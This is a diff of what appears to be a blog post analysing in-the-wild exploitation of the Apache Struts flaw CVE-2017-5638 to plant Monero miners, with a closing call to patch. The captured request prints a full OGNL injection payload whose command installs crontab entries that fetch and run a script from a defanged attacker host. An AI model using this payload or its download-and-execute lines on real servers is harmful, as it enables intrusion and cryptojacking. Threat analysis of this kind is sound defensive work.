@@ -22,7 +22,14 @@ Connection: keep-alive
 Accept-Encoding: gzip, deflate
 Accept: */*
 User-Agent: Mozilla/5.0
-Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget -O - -q hXXp://5.188.87[.]12/icons/logo.jpg|sh\n*/19 * * * * curl hXXp://5.188.87[.]12/icons/logo.jpg|sh" | crontab -;wget -O - -q hXXp://5.188.87[.]12/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context
+['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget 
+-O - -q hXXp://5.188.87[.]12/icons/logo.jpg|sh\n*/19 * * * * curl hXXp://5.188.87[.]12/icons/logo.jpg|sh" | crontab -;wget -O - -q hXXp://5.188.87[.]12/
+icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash',
+'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=
+(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
+(#ros.flush())}
 X-Forwarded-For: 5.188.10[.]251
 ```
 
@@ -87,8 +94,8 @@ Based on available information on the Internet, 158.69.25[.]77 points to `ca[.]m
 
 ![MineXMR Servers](../img/miner_servers.png){:.post_image}
 
-Even if CVE-2017-5638 was fixed relatively fast, attackers had success exploiting this for another year or so. This earned them 314.485 XMR (~ $15.286) *at least*.
-
 ![Miners Profit](../img/miner_profit.png){:.post_image}
+
+Even if CVE-2017-5638 was fixed relatively fast, attackers had success exploiting this for another year or so. This earned them 314.485 XMR (~ $15.286) *at least*.
 
 As a conclusion, I would say PATCH! PATCH! and PATCH! This is the easiest and *cheapest* way to stay mitigate a a big part of security risks.
